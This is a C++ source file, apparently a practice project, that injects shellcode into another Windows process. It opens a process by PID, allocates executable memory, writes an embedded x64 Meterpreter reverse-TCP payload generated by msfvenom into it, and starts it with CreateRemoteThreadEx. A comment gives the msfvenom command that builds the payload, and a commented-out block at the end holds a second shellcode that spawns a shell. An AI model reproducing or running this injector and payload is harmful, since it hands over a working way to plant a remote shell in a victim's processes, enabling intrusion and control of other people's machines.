// ProcessInjection_01.cpp : This file contains the 'main' function. Program execution begins and ends there.// VIRTUALPROTECT -> API TO CHANGE PERMISSIONS IN MEMORY 
// VIRTUALPROTECT -> API TO CHANGE PERMISSIONS IN MEMORY 

#include <iostream>
#include <windows.h>
#include <stdio.h> 

//* to compile reverse shell, use msfvenom 
//... in the console: msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=localhost LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke

/* Init*/
DWORD PID = NULL;  // process id 
HANDLE hProcess = NULL; // process 
LPVOID rBuffer = NULL; //  data to inject into thread  (buffer)  
HANDLE hThread = NULL;  // handle thread to write memory 
DWORD TID = NULL; // thread ID

//payload
//[X64 ARCHITECTURE]
unsigned char crowPuke[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x51\x56\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x49\x01\xd0\x50\x8b"
"\x48\x18\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x01\xbb\x00\x00\x00\x00\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d"
"\x2a\x0a\x41\x89\xda\xff\xd5";



int main(int argc, char* arg[])
{
	if (argc < 2)
	{
		printf("[-] Usage: %s <PID>\n", arg[0]);
		return EXIT_FAILURE;
	}

	PID = atoi(arg[1]);
	printf("[+] PID: ", PID);

	// Opens handle TO A PROCESS 
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL) {
		printf("[-] Error: Unable to open process %d\n");//, PID, GetLastError());
		printf("Error: ", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Hprocess " , hProcess);

	;
/*
	// rBuffer -> ALLOCATE MEMORY SPACE OF THE PAYLOAD, DOES NOT EXECUTE. 
	// MEM_RESERVE -> RESERVES A RANGE OF THE PERESONS VERITUAL ADDRESS SPACE WITHOUT ACTUALLY ALLOCATING 
	// MEM_COMMIT -> SETS ASIDE SPACE TO WRITE (DOES NOT WRITE) 
*/ 
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(crowPuke), (MEM_COMMIT, MEM_RESERVE), PAGE_EXECUTE_READWRITE); 
	if (rBuffer == NULL) {
		printf("[-] Error in rBuffer "); 
		printf("Error: ", GetLastError());
	}

	printf("[+] rBuffer ", rBuffer, "with  a permission of ", PAGE_EXECUTE_READWRITE, "Memory Committed: ", MEM_COMMIT, "Memory Reserved ", MEM_RESERVE);
	printf("allocated size: ", sizeof(crowPuke)); 



	// Write the allocated memory: insert payload (defined above) into memory 
	WriteProcessMemory(hProcess, rBuffer, crowPuke, sizeof(crowPuke), NULL); 

	// Create thread to run payload 
	hThread = CreateRemoteThreadEx(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)rBuffer,NULL, 0, 0, &TID);

	if (hThread == NULL) {
		printf("[-] Error in hThread ");
		printf("Error: ", GetLastError());
		return 1; 
	}

	printf("[+] Thread Created: ", hThread);
	printf("Thread ID: ", TID);	

	printf("[!] Cleaingin up ");
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("[+].. great success! ");

	return EXIT_SUCCESS;

	// VIRTUALALLOC()- ALLOCATE BYTES TO  




}











	/*
	// Allocate memory in the remote process
	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL) {
		printf("Error: Unable to allocate memory in the remote process\n");
		return EXIT_FAILURE;
	}

	// Write the shellcode to the remote process
	char shellcode[] = "\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x31\xf6\x48\x31\xd2\x0f\x05";
	if (!WriteProcessMemory(hProcess, lpBaseAddress, shellcode, sizeof(shellcode), NULL)) {
		printf("Error: Unable to write shellcode to the remote process\n");
		return EXIT_FAILURE;
	}

	// Create a remote thread in the remote process
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, NULL, 0, NULL);
	if (hThread == NULL) {
		printf("Error: Unable to create remote thread in the remote process\n");
		return EXIT_FAILURE;
*/

